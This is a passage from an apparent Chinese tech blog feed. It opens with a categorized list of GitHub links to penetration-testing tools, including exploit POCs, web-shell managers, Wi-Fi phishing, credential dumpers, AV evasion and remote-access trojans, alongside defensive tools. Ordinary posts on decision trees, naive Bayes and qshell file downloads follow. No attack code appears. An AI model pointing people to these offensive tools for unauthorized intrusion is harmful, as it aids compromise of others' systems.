href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀：<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p><p>git泄露利用EXP：<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架：<br><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本：<br><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a></p><p>一款开源WAF：<br><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a></p><p>http命令行客户端：<br><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器：<br><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a></p><p>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a></p><p>自动化代码审计工具<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a></p><p>浏览器攻击框架：<br><a href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a></p><p>tomcat自动后门部署：<br><a href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a></p><p>网络空间指纹扫描器：<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a></p><p>burpsuit之J2EE扫描插件：<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p><h2 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h2><p>mimikatz明文注入：<br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集：<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集：<br><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a></p><p>powershell的mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a></p><p>域渗透教程:<br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p><p>Fuzz:<br>Web向Fuzz工具<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p><h2 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h2><p>msf框架：<br><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p><p>pocsscan攻击框架：<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite攻击框架:<br><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto攻击框架：<br><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a></p><p>漏洞POC&amp;EXP:<br>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a></p><p>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC：<br><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具:<br><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具:<br><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h2 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h2><p>中间人攻击框架:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:<br><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼:<br><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>密码破解工具:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器:<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><h2 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h2><p>二进制分析工具<br><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a></p><p>系统扫描器<br><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a></p><p>rp:<br><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具<br><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）:<br><a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具:<br><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）:<br><a href="https://github.com/angr/angr">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具:<br><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:<br><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具:<br><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p><h2 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h2><p>二进制EXP编写工具:<br><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架:<br><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a></p><p>跨平台注入工具:<br><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p><p>哈希长度扩展攻击EXP：<br><a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>隐写检测工具<br><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p><h2 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h2><p>data_hacking合集:<br><a href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置:<br><a href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记:<br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料:<br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a></p><p>《DO NOT FUCK WITH A HACKER》:<br><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a></p><p>各类安全脑洞图：<br><a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p><p>信息安全流程图：<br><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p><h2 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h2><p>近年ctf writeup大全:<br><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo:<br><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a></p><p>ctf Resources:<br><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a></p><p>ctf及黑客资源合集:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集:<br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a></p><p>ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p><h2 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h2><p>大礼包（什么都有）:<br><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全:<br><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料:<br><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a></p><p>python框架，库，资源大合集:<br><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:<br><a href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a></p><p>python任务管理以及命令执行库:<br><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库:<br><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a></p><p>Veil-Evasion免杀项目：<br><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>py3 爬虫框架:<br><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库:<br><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库:<br><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集:<br><a href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统:<br><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p><h2 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h2><p>科学上网工具<br><a href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a></p><h2 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h2><p>微信自动抢红包动态库<br><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>hardsed神器:<br><a href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p><h2 id="甲方安全工程师生存指南"><a href="#甲方安全工程师生存指南" class="headerlink" title="甲方安全工程师生存指南"></a>甲方安全工程师生存指南</h2><p>web索引及日志搜索工具：<br><a href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a></p><p>开源日志采集器：<br><a href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a></p><p>扫描CS结构的web debuger<br><a href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a></p><p>恢复sqlite数据库删除注册信息：<br><a href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a></p><p>gps欺骗检测工具:<br><a href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a></p><p>应急处置响应框架:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a></p><p>web安全开发指南:<br><a href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a></p><p>各个知名厂商漏洞测试报告模板：<br><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a></p><p>linux下恶意代码检测包：<br><a href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a></p><p>操作系统运行指标可视化框架：<br><a href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a></p><p>恶意代码分析系统：<br><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a></p><p>定期搜索及存储web应用：<br><a href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a></p><p>事件响应框架：<br><a href="https://github.com/google/grr">https://github.com/google/grr</a></p><p>综合主机监控检测平台：<br><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a></p><p>分布式实时数字取证系统：<br><a href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a></p><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：<br><a href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p><h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><p>SSH蜜罐：<br><a href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源：<br><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐：<br><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐：<br><a href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐：<br><a href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐：<br><a href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐：<br><a href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p><h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>用gmail充当C&amp;C服务器的后门<br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a></p><p>开源的远控：<br><a href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a></p><p>c#远控：<br><a href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(11)——决策树</title>
    <link href="/2018/12/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-11-%E2%80%94%E2%80%94%E5%86%B3%E7%AD%96%E6%A0%91/"/>
    <url>/2018/12/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-11-%E2%80%94%E2%80%94%E5%86%B3%E7%AD%96%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-决策树"><a href="#0x00-决策树" class="headerlink" title="0x00 决策树"></a>0x00 决策树</h2><p>决策树在机器学习中是一种经典的分类算法。决策树的结构是一个树结构(可以是二叉树或非二叉树)。其中每个非叶节点表示一个特征属性上的测试，每个分支代表这个特证属性在某个值域上的输出，而每个叶子节点存放一个类别。使用决策树进行决策的过程就是从根节点开始，测试待分类项中相应的特征属性，并按照其值选择输出分支，直到到达叶子节点，此时叶子节点上的类别就是决策结果。</p><p>举个例子，假如我们要判断一只动物是不是兔子，这是典型的二分类问题，结果只有是兔子和不是兔子两种。我们可以用来判断的特征有：四条腿走路、耳朵、体型、尾巴等很多信息，这些特征都位于非叶节点，我们输入一个新的动物，就可以通过这些特征来一步步走向分类的叶子节点。</p><h2 id="0x01-决策树过程描述"><a href="#0x01-决策树过程描述" class="headerlink" title="0x01 决策树过程描述"></a>0x01 决策树过程描述</h2><p>具体过程如下图</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_01.png?raw=true"></p><p>最重要的问题在于第八行中如何选择这个最优属性，什么是最优属性呢？就是说这个属性要做到尽量多的降低不确定性，为了找出算哪个属性才能降低最多不确定性，就需要引入信息熵的概念了。</p><h2 id="0x02-信息熵与信息增益"><a href="#0x02-信息熵与信息增益" class="headerlink" title="0x02 信息熵与信息增益"></a>0x02 信息熵与信息增益</h2><h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><p>在看信息熵之前我们先看一下香农对信息的定义：信息是用来消除随机不确定性的东西。</p><h4 id="信息的衡量-信息熵"><a href="#信息的衡量-信息熵" class="headerlink" title="信息的衡量-信息熵"></a>信息的衡量-信息熵</h4><p>信息熵指一个信息能够消除不确定性的大小</p><p>信息熵的定义式：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_02.png?raw=true"></p><p>条件熵计算：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_04.png?raw=true"></p><h4 id="信息增益"><a href="#信息增益" class="headerlink" title="信息增益"></a>信息增益</h4><p>特征A对训练数据集D的信息增益g(D,A)，定义为集合D的信息熵H(D)与特征A给定条件下D的信息条件熵H(D|A)之差，公式为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_03.png?raw=true"></p><p>随着决策树的每层进行，我们希望决策树分支节点所包含的样本尽可能的属于同一类别，也就是说“纯度”越来越高，而信息增益越大，意味着使用这个属性对决策树的“纯度”提升越大。</p><p>所以，我们根据这里计算出来的信息增益的大小，就可以解决选择最优属性的问题。</p><h2 id="0x03-剪枝处理"><a href="#0x03-剪枝处理" class="headerlink" title="0x03 剪枝处理"></a>0x03 剪枝处理</h2><p>剪枝是决策树中应对过拟合的手段，在决策树学习中由于划分过程不断重复，有时会造成决策树分支过多，这种情况下一些训练集的特点会被当作所有数据都具有的一般性质而导致过拟合。需要进行剪枝处理。</p><p>决策树的剪枝策略分为预剪枝和后剪枝。</p><ul><li>预剪枝是指在决策树的生成过程中，对每个节点在划分前先进行估计。若当前结点的划分不能带来决策树泛化性能提升，则停止划分并将当前结点标记为叶子结点。</li><li>后剪枝是从训练集生成一颗完整的决策树，然后自底向上对非叶结点进行考察，如果将该结点替换成叶结点会提升泛化性能，则替换。</li></ul><h2 id="0x04-连续值处理"><a href="#0x04-连续值处理" class="headerlink" title="0x04 连续值处理"></a>0x04 连续值处理</h2><p>实际情况中，我们遇到的属性并不一定都是像“有无尾巴”等这样离散的，有一部分属性是连续的数值如“质量”、“密度”等等。这种情况下由于连续值是无限多的，不能分别作为结点，所以就要采取一定的策略对连续属性进行处理。</p><p>最常用的策略是二分法，首先我们假设在样本D中有n个不同的取值，将他们从小到大进行排序，记为{a1、a2、···an}，然后取每两个相邻点的平均值</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml11_05.png?raw=true"></p><p>共n-1个值作为候选划分点，然后用考察离散属性值的方法来选取最优划分点来进行集合的划分。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(10)——贝叶斯分类</title>
    <link href="/2018/12/22/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-10-%E2%80%94%E2%80%94%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB/"/>
    <url>/2018/12/22/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-10-%E2%80%94%E2%80%94%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-贝叶斯分类"><a href="#0x00-贝叶斯分类" class="headerlink" title="0x00 贝叶斯分类"></a>0x00 贝叶斯分类</h2><p>贝叶斯分类算法是统计学的一种分类方法，它是一类利用概率统计知识进行分类的算法。在许多场合，朴素贝叶斯(Naïve Bayes，NB)分类算法可以与决策树和神经网络分类算法相媲美，该算法能运用到大型数据库中，而且方法简单、分类准确率高、速度快。</p><h2 id="0x01-贝叶斯决策论"><a href="#0x01-贝叶斯决策论" class="headerlink" title="0x01 贝叶斯决策论"></a>0x01 贝叶斯决策论</h2><p>在分类任务中，我们不一定会得到明确的分类结果，而是得到可能被划分到每一种分类的概率。贝叶斯决策论就是用来决定出这个分类结果的方法。</p><p>贝叶斯决策论是概率框架下实施决策的基本方法，对分类任务来说，在所有相关概率都已知的情况下，贝叶斯决策论考虑如何基于这些概率和误判损失来选择最优类别标记。</p><h2 id="0x02-贝叶斯公式"><a href="#0x02-贝叶斯公式" class="headerlink" title="0x02 贝叶斯公式"></a>0x02 贝叶斯公式</h2><p>贝叶斯公式：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml10_01.png?raw=true"></p><p>其中</p><ul><li>P(A|B) 是在 B 发生的情况下 A 发生的概率；</li><li>P(A) 是 A 发生的概率；</li><li>P(B|A) 是在 A 发生的情况下 B 发生的概率；</li><li>P(B) 是 B 发生的概率。</li></ul><p>我们可以通过一个例子来解释这个公式，假设我们知道这几个概率：</p><ul><li>50%的下雨天早上是多云</li><li>但是多云天气很多（40%的日子早上都是多云）</li><li>这个月不怎么下雨（平均30天只有3天下雨，10%的下雨几率）</li></ul><p>然后，早晨起来发现天气是多云，怎么知道今天下雨的概率是多少？</p><p>我们在这里用P(雨)代表下雨，P(云)代表多云，那么我们要求的事件就是：早晨多云的情况下下雨的概率是多少，也就是P(雨|云)。</p><p>然后我们就可以套用在贝叶斯公式中：</p><p>P(雨|云)=P（云|雨）* P（雨）/ P（云）</p><p>而通过前面的条件已经知道，P（云|雨）=0.5，P（雨）=0.1，P（云）=0.4，那么我们就可以算出早晨多云的情况下下雨的概率是0.5*0.1/0.4=0.125。只有1/8的概率下雨。</p><p>这是贝叶斯公式的一个简单应用，但在实际任务中我们的事件会更多更复杂，也就是说不会是单纯的P（雨）、P（云）这么简单的单一事件，而是多个事件的联合概率，这个时候联合概率在样本不足的情况下无法直接计算，所以我们就引入了朴素贝叶斯分类方法。</p><h2 id="0x03-朴素贝叶斯分类"><a href="#0x03-朴素贝叶斯分类" class="headerlink" title="0x03 朴素贝叶斯分类"></a>0x03 朴素贝叶斯分类</h2><p>也就是说朴素贝叶斯这一方法，是由于实际情况中，我们难以从有限的样本中直接获得在所有属性上的联合类条件概率而引出的，那么朴素贝叶斯方法是这样解决联合条件概率问题的：</p><p>朴素贝叶斯分类器对所有已知类别，假设所有属性相互独立。也就是说每个属性独立的对分类结果进行影响。</p><p>当所有属性都独立的时候，联合概率就变为了：</p><p>P(A,B)=P(A)*P(B)</p><p>这样我们就可以很轻易的使用已知样本中得到的单一概率来一步步算出所需的类条件概率P(B|A)了。</p><p>此时，贝叶斯公式可写为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml10_02.png?raw=true"></p><p>其中d为属性数目，Bi为B在第i个属性上的取值。</p><p>而对所有类别P(B)相同，因此贝叶斯准则为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml10_03.png?raw=true"></p><p>这就是朴素贝叶斯分类器的表达式。</p><p>其中arg数学含义：</p><p>argument of the maximum/minimum<br>arg max f(x): 当f(x)取最大值时，x的取值<br>arg min f(x): 当f(x)取最小值时，x的取值</p><p>我们只需在训练过程中基于训练集来估计类先验概率P(A),并为每个属性估计条件概率P(Bi|A)即可。</p><p>然后我们就根据计算出来的概率大小来判断属于哪一类。</p><h2 id="0x04-半朴素贝叶斯分类器"><a href="#0x04-半朴素贝叶斯分类器" class="headerlink" title="0x04 半朴素贝叶斯分类器"></a>0x04 半朴素贝叶斯分类器</h2><p>朴素贝叶斯分类使用条件独立性假设降低了后验概率计算的困难，但是这个假设是很难成立的，因为很多属性之间本来就具有很高的依赖性，所以就产生了一种“半朴素贝叶斯分类器”的方法来进行改善。</p><p>半朴素贝叶斯分类器的基本思想是适当考虑一部分属性间的相互依赖信息，从而既不需要进行完全的联合概率计算，又能保证不会忽略掉比较强的属性依赖关系。</p><p>其中最常用的策略是“独依赖统计（One Dependent Estimator）”，这种方法是假设每个属性在类别之外最多只依赖一个其他属性，这个属性被称为他的父属性。而如何确定这个父属性，现在有SPODE(Super Parent ODE)，TAN(Tree Augmented naive Bayes)，AODE(Averaged One-Dependent Estimator)等方法。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用qshell批量下载七牛云文件</title>
    <link href="/2018/10/24/%E4%BD%BF%E7%94%A8qshell%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E4%B8%83%E7%89%9B%E4%BA%91%E6%96%87%E4%BB%B6/"/>
    <url>/2018/10/24/%E4%BD%BF%E7%94%A8qshell%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD%E4%B8%83%E7%89%9B%E4%BA%91%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>说起七牛云，国内很多人都因为它提供的免费存储和每日的10g免费流量，将它当作图床使用，我在建立博客的第一年里也是使用七牛云做图床的。</p><p>不过昨天忽然收到一条七牛云的域名回收通知邮件，告诉我的七牛云域名将在7个工作日后被回收。登陆进账户后发现的确是这样的，而且之后的测试域名也只提供30天试用，无法再当作图床。</p><p><img src="https://github.com/echohun/blog_image/blob/master/qshell_download/qshell01.png?raw=true"></p><p>准备将所有资源都迁移出来时，发现云存储的管理界面并不存在批量下载的功能，这个时候总不能一个一个下载吧？所以在经过几分钟的寻找之后，发现七牛云提供的管理工具qshell拥有批量下载的功能，所以就写个博客把如何通过qshell批量下载文件的方法记录下来，提供给有同样需求的朋友们参考。</p><h2 id="0x01-下载并配置qshell"><a href="#0x01-下载并配置qshell" class="headerlink" title="0x01 下载并配置qshell"></a>0x01 下载并配置qshell</h2><p>七牛云的开发者中心提供qshell的下载地址： <a href="https://developer.qiniu.com/kodo/tools/1302/qshell">https://developer.qiniu.com/kodo/tools/1302/qshell</a></p><p>我们只需要下载自己机器对应的版本就可以了。</p><p>接下来我们需要将qshell与我们七牛云的账号绑定，官方给出的命令是account，我们在qshell的路径打开command并输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">qshell account <span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">AccessKey</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">Your</span> <span class="hljs-attr">SecretKey</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个AccessKey和SecretKey在我们账号的个人中心-&gt;密钥管理中可以找到。</p><p><img src="https://github.com/echohun/blog_image/blob/master/qshell_download/qshell02.png?raw=true"></p><p>account文档: <a href="https://github.com/qiniu/qshell/blob/master/docs/account.md">https://github.com/qiniu/qshell/blob/master/docs/account.md</a></p><h2 